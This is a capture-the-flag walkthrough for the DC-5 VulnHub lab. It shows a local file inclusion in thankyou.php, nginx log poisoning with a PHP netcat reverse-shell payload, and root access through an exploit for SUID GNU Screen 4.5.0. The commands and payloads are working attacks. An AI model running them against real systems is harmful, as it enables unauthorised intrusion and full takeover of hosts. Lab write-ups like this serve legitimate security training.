# VulnHub > DC 5

**About Release**

* Name: DC: 5
* Date release: 21 Apr 2019
* Author: DCAU
* Series: DC
* Web page: http://www.five86.com/dc-5.html

**Description**

DC-5 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.

The plan was for DC-5 to kick it up a notch, so this might not be great for beginners, but should be ok for people with intermediate or better experience. Time will tell (as will feedback).

As far as I am aware, there is only one exploitable entry point to get in (there is no SSH either). This particular entry point may be quite hard to identify, but it is there. You need to look for something a little out of the ordinary (something that changes with a refresh of a page). This will hopefully provide some kind of idea as to what the vulnerability might involve.

And just for the record, there is no phpmailer exploit involved. :-)

The ultimate goal of this challenge is to get root and to read the one and only flag.

Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.

For beginners, Google can be of great assistance, but you can always tweet me at @DCAU7 for assistance to get you going again. But take note: I won't give you the answer, instead, I'll give you an idea about how to move forward.

But if you're really, really stuck, you can watch this video which shows the first step.

**Download**

* DC-5.zip (Size: 521 MB)
* Download: http://www.five86.com/downloads/DC-5.zip
* Download (Mirror): https://download.vulnhub.com/dc/DC-5.zip
* Download (Torrent): https://download.vulnhub.com/dc/DC-5.zip.torrent ([Magnet](magnet:?xt=urn:btih:39F6C4634D3C666B0F0A68F3B0B7E61D208AAA31&dn=DC-5.zip&tr=http%3A%2F%2Ftracker.vulnhub.com%3A6969/announce&tr=udp%3A%2F%2Ftracker.vulnhub.com%3A6969/announce&tr=udp%3A%2F%2Ftracker.openbittorrent.com%3A80/announce&tr=udp%3A%2F%2Ftracker.publicbt.com%3A80/announce&tr=udp%3A%2F%2Ftracker.istole.it%3A6969))

# Initial foothold

## Services Enumeration

Nmap detects 3 open ports:

~~~
PORT      STATE SERVICE VERSION
80/tcp    open  http    nginx 1.6.2
|_http-server-header: nginx/1.6.2
|_http-title: Welcome
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          36758/udp6  status
|   100024  1          43482/udp   status
|   100024  1          46179/tcp   status
|_  100024  1          48036/tcp6  status
46179/tcp open  status  1 (RPC #100024)
~~~

## Web enumeration

Connecting to the target with the browser shows a simple website with several pages (Home, Solutions, About Us, FAQ, Contact). The contact form does not seem to be vulnerable to SQL injection.

Scanning the web service with gobuster doesn't reveal hidden sources.

~~~
kali@kali:/data/DC_5$ gobuster dir -u http://dc-5/ -x htm,html,php,txt,bak,old,zip,tar,gz -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://dc-5/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     old,zip,htm,txt,bak,tar,gz,html,php
[+] Timeout:        10s
===============================================================
2020/10/07 10:35:23 Starting gobuster
===============================================================
/images (Status: 301)
/index.php (Status: 200)
/contact.php (Status: 200)
/faq.php (Status: 200)
/solutions.php (Status: 200)
/footer.php (Status: 200)
/css (Status: 301)
/about-us.php (Status: 200)
/thankyou.php (Status: 200)
===============================================================
2020/10/07 10:39:34 Finished
===============================================================
~~~

## Reversing the `thankyou.php` page

### Copyright date

Now, browsing the application carefully will reveal something peculiar. The footer of each page is consistent and shows "Copyright 2019". However, submitting the contact form will redirect to a `thankyou.php` page that shows a Copyright date randomly generated.

Having a look at the different sources, we can easily guess that the footer of the `thankyou.php` page is including `footer.php`:

~~~
kali@kali:/data/DC_5$ for i in {1..10};do curl -s http://dc-5/footer.php;echo "";done
Copyright © 2020
Copyright © 2019
Copyright © 2017
Copyright © 2018
Copyright © 2017
Copyright © 2018
Copyright © 2019
Copyright © 2019
Copyright © 2018
Copyright © 2018
~~~

The PHP code is likely something like:

```php
<div class="footer-wrapper">
	<footer>
		<?php include("footer.php"); ?>
	</footer>
</div>
```

Interesting, but not likely to be exploitable though.

### Parameters

The form submits the fields using the GET method, which is quite unusual:

~~~
http://dc-5/thankyou.php?firstname=my+first+name&lastname=my+last+name&country=usa&subject=My+test+subject
~~~

It may be interesting to fuzz the page to check if any other parameter may be included.

# Local File Inclusion (LFI) vulnerability

## Discover the hidden `file` parameter

Let's fuzz the page and see if there are hidden parameters that we may use to read files (LFI).

~~~
kali@kali:/data/DC_5$ wfuzz -u http://dc-5/thankyou.php?FUZZ=/etc/passwd -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hw=66

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://dc-5/thankyou.php?FUZZ=/etc/passwd
Total requests: 220560

===================================================================
ID           Response   Lines    Word     Chars       Payload                                             
===================================================================

000000759:   200        70 L     104 W    2319 Ch     "file"                                              

~~~

## Read arbitrary files

`wfuzz` has discovered a hidden `file` parameter that we can use to read arbitrary files (e.g. `/etc/passwd`):

~~~
kali@kali:/data/DC_5$ curl -s http://dc-5/thankyou.php?file=/etc/passwd
<!doctype html>

<html lang="en">
<head>
	<meta charset="utf-8">
	<title>Contact</title>
	<link rel="stylesheet" href="css/styles.css">
</head>

<body>
	<div class="body-wrapper">
		<div class="header-wrapper">
			<header>
				DC-5 is alive!
			</header>
		</div>
		
		<div class="menu-wrapper">
			<menu>
				<ul>
					<a href="index.php"><li>Home</li></a>
					<a href="solutions.php"><li>Solutions</li></a>
					<a href="about-us.php"><li>About Us</li></a>
					<a href="faq.php"><li>FAQ</li></a>
					<a href="contact.php"><li>Contact</li></a>
				</ul>
			</menu>
		</div>
	
		<div class="body-content">
			<h2>Thank You</h2>

				<p>Thank you for taking the time to contact us.</p>

		</div>
		
		<div class="footer-wrapper">
			<footer>
				root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:103:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/false
Debian-exim:x:104:109::/var/spool/exim4:/bin/false
messagebus:x:105:110::/var/run/dbus:/bin/false
statd:x:106:65534::/var/lib/nfs:/bin/false
sshd:x:107:65534::/var/run/sshd:/usr/sbin/nologin
dc:x:1000:1000:dc,,,:/home/dc:/bin/bash
mysql:x:108:113:MySQL Server,,,:/nonexistent:/bin/false
			</footer>
		</div>
	</div>
</body>
</html>
~~~

## Log poisoning

The `thankyou.php` page is likely including the page given to the `file` parameter as follows:

```php
include($_GET['file']);
```

We can exploit this to poison the Nginx log file (Nmap told us that the web server is running on Nginx). Let's check if we can read the `access.log` file:

~~~
kali@kali:/data/DC_5$ curl -s http://dc-5/thankyou.php?file=/var/log/nginx/access.log
<!doctype html>

<html lang="en">
<head>
	<meta charset="utf-8">
	<title>Contact</title>
	<link rel="stylesheet" href="css/styles.css">
</head>

<body>
	<div class="body-wrapper">
		<div class="header-wrapper">
			<header>
				DC-5 is alive!
			</header>
		</div>
		
		<div class="menu-wrapper">
			<menu>
				<ul>
					<a href="index.php"><li>Home</li></a>
					<a href="solutions.php"><li>Solutions</li></a>
					<a href="about-us.php"><li>About Us</li></a>
					<a href="faq.php"><li>FAQ</li></a>
					<a href="contact.php"><li>Contact</li></a>
				</ul>
			</menu>
		</div>
	
		<div class="body-content">
			<h2>Thank You</h2>

				<p>Thank you for taking the time to contact us.</p>

		</div>
		
		<div class="footer-wrapper">
			<footer>
				172.16.222.128 - - [10/Oct/2020:04:24:22 +1000] "GET /thankyou.php?file=/var/log/nginx/access.log HTTP/1.1" 200 847 "-" "curl/7.72.0"
172.16.222.128 - - [10/Oct/2020:04:25:01 +1000] "GET / HTTP/1.1" 200 1718 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0"
172.16.222.128 - - [10/Oct/2020:04:25:03 +1000] "GET /index.php HTTP/1.1" 200 1718 "http://dc-5/" "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0"
172.16.222.128 - - [10/Oct/2020:04:25:04 +1000] "GET /solutions.php HTTP/1.1" 200 1746 "http://dc-5/index.php" "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0"
172.16.222.128 - - [10/Oct/2020:04:25:05 +1000] "GET /about-us.php HTTP/1.1" 200 1824 "http://dc-5/solutions.php" "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0"
172.16.222.128 - - [10/Oct/2020:04:25:06 +1000] "GET /faq.php HTTP/1.1" 200 2245 "http://dc-5/about-us.php" "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0"
172.16.222.128 - - [10/Oct/2020:04:25:06 +1000] "GET /contact.php HTTP/1.1" 200 1830 "http://dc-5/faq.php" "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0"
172.16.222.128 - - [10/Oct/2020:04:25:13 +1000] "GET /thankyou.php?firstname=test&lastname=test&country=australia&subject=test HTTP/1.1" 200 423 "http://dc-5/contact.php" "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0"
172.16.222.128 - - [10/Oct/2020:04:25:15 +1000] "GET /thankyou.php?firstname=test&lastname=test&country=australia&subject=test HTTP/1.1" 200 423 "http://dc-5/contact.php" "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0"
172.16.222.128 - - [10/Oct/2020:04:25:15 +1000] "GET /css/styles.css HTTP/1.1" 304 0 "http://dc-5/thankyou.php?firstname=test&lastname=test&country=australia&subject=test" "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0"
172.16.222.128 - - [10/Oct/2020:04:25:15 +1000] "GET /thankyou.php?firstname=test&lastname=test&country=australia&subject=test HTTP/1.1" 200 422 "http://dc-5/contact.php" "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0"
172.16.222.128 - - [10/Oct/2020:04:25:15 +1000] "GET /css/styles.css HTTP/1.1" 304 0 "http://dc-5/thankyou.php?firstname=test&lastname=test&country=australia&subject=test" "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0"
172.16.222.128 - - [10/Oct/2020:04:25:24 +1000] "GET /thankyou.php?firstname=filename=/etc/passwd HTTP/1.1" 200 423 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0"
172.16.222.128 - - [10/Oct/2020:04:25:38 +1000] "GET /thankyou.php?firstname?file=/etc/passwd HTTP/1.1" 200 422 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0"
172.16.222.128 - - [10/Oct/2020:04:25:45 +1000] "GET /thankyou.php?file=/etc/passwd HTTP/1.1" 200 986 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0"
			</footer>
		</div>
	</div>
</body>
</html>
~~~

OK, now, we'll use this to poison the log file and inject a reverse shell command in the User-Agent string:

~~~
$ curl -A "<?php system('nc -e /bin/bash 172.16.222.128 4444'); ?>" -s http://dc-5/thankyou.php
~~~

Now, start a listener (`rlwrap nc -nlvp 4444`) and call the access.log file again. It will be included and the PHP string will be interpreted.

~~~
kali@kali:/data/DC_5$ curl -s http://dc-5/thankyou.php?file=/var/log/nginx/access.log
~~~

## Reverse shell

And now, we have a reverse shell:

~~~
kali@kali:/data/DC_5$ rlwrap nc -nlvp 4444
listening on [any] 4444 ...
connect to [172.16.222.128] from (UNKNOWN) [172.16.222.160] 43771
which python
/usr/bin/python
python -c "import pty;pty.spawn('/bin/bash')"
www-data@dc-5:~/html$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
~~~

# Privilege escalation

## SUID programs owned by root

Checking for files owned by root with the SUID bit set reveals an interesting program (`screen-4.5.0`):

~~~
www-data@dc-5:~/html$ find / -type f -user root -perm -u=s 2>/dev/null
find / -type f -user root -perm -u=s 2>/dev/null
/bin/su
/bin/mount
/bin/umount
/bin/screen-4.5.0 <---------- interesting!
/usr/bin/gpasswd
/usr/bin/procmail
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/chsh
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/sbin/exim4
/sbin/mount.nfs
www-data@dc-5:~/html$ 
~~~

## Downloading the exploit

Searching on exploit-db will reveal that we can exploit it for a privilege escalation:

~~~
kali@kali:/data/DC_5/files$ searchsploit screen 4.5.0
----------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                     |  Path
----------------------------------------------------------------------------------- ---------------------------------
GNU Screen 4.5.0 - Local Privilege Escalation                                      | linux/local/41154.sh
GNU Screen 4.5.0 - Local Privilege Escalation (PoC)                                | linux/local/41152.txt
----------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
kali@kali:/data/DC_5/files$ searchsploit -m 41154
~~~

## Exploit compilation

Trying to compile the sources on the target will fail:

~~~
www-data@dc-5:/tmp$ gcc -fPIC -shared -ldl -o libhax.so libhax.c
gcc -fPIC -shared -ldl -o libhax.so libhax.c
gcc: error trying to exec 'cc1': execvp: No such file or directory
~~~

Compile the sources on the Kali machine directly, transfer the files to the target, and run the exploit on the target.

~~~
$ gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
$ gcc -o /tmp/rootshell /tmp/rootshell.c
~~~

## Run the exploit

The exploit will run fine on the target and you should get a root shell:

~~~
www-data@dc-5:/tmp$ cd /etc
www-data@dc-5:/etc$ umask 000
www-data@dc-5:/etc$ screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so"
www-data@dc-5:/etc$ screen -ls
www-data@dc-5:/etc$ /tmp/rootshell
# id
id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
~~~

# Root flag

Now root, let's get the flag:

~~~
# cd /root
cd /root
# ls -la
ls -la
total 24
drwx------  2 root root 4096 Apr 20  2019 .
drwxr-xr-x 23 root root 4096 Apr 19  2019 ..
-rw-------  1 root root   16 Apr 20  2019 .bash_history
-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
-rw-r--r--  1 root root  140 Nov 20  2007 .profile
-rw-r--r--  1 root root 1212 Apr 20  2019 thisistheflag.txt
# cat thisistheflag.txt
cat thisistheflag.txt


888b    888 d8b                                                      888      888 888 888 
8888b   888 Y8P                                                      888      888 888 888 
88888b  888                                                          888      888 888 888 
888Y88b 888 888  .d8888b .d88b.       888  888  888  .d88b.  888d888 888  888 888 888 888 
888 Y88b888 888 d88P"   d8P  Y8b      888  888  888 d88""88b 888P"   888 .88P 888 888 888 
888  Y88888 888 888     88888888      888  888  888 888  888 888     888888K  Y8P Y8P Y8P 
888   Y8888 888 Y88b.   Y8b.          Y88b 888 d88P Y88..88P 888     888 "88b  "   "   "  
888    Y888 888  "Y8888P "Y8888        "Y8888888P"   "Y88P"  888     888  888 888 888 888 
                                                                                          
                                                                                          


Once again, a big thanks to all those who do these little challenges,
and especially all those who give me feedback - again, it's all greatly
appreciated.  :-)

I also want to send a big thanks to all those who find the vulnerabilities
and create the exploits that make these challenges possible.

~~~
